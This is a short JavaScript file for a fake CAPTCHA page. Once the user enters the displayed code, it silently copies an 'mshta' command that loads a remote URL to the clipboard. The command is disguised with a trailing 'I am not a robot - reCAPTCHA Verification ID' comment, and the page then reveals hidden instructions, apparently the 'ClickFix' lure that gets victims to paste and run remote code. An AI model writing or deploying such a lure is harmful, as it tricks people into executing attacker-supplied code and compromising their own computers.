// script.js
let correctCaptcha = "W4rK1"; // The text that the user should input

function generateCaptcha() {
    // Simple random string for captcha, you can make this more complex
    let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let captcha = '';
    for (let i = 0; i < 5; i++) {
        captcha += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    correctCaptcha = captcha;

    // Display the CAPTCHA in the image-like div
    document.getElementById('captchaImage').innerText = captcha;
}

function verifyCaptcha() {
    let userInput = document.getElementById('captchaInput').value;
    let resultMessage = document.getElementById('resultMessage');
    let commandInstructions = document.querySelector('.command-instructions');
    
    if (userInput === correctCaptcha) {
        resultMessage.innerText = 'CAPTCHA Verified Successfully!';
        resultMessage.style.color = 'green';

        // Copy the command to clipboard
        const command = "mshta https://web.archive.org/recaptcha-verify # ✅ ''I am not a robot - reCAPTCHA Verification ID: 7537''";
        navigator.clipboard.writeText(command).then(() => {
            commandInstructions.style.display = 'block'; // Show instructions
        }).catch(err => {
            resultMessage.innerText = 'Failed to copy the command.';
            resultMessage.style.color = 'red';
        });
    } else {
        resultMessage.innerText = 'Invalid CAPTCHA. Please try again.';
        resultMessage.style.color = 'red';
    }
}

// Initialize CAPTCHA on page load
document.addEventListener('DOMContentLoaded', () => {
    generateCaptcha();
});
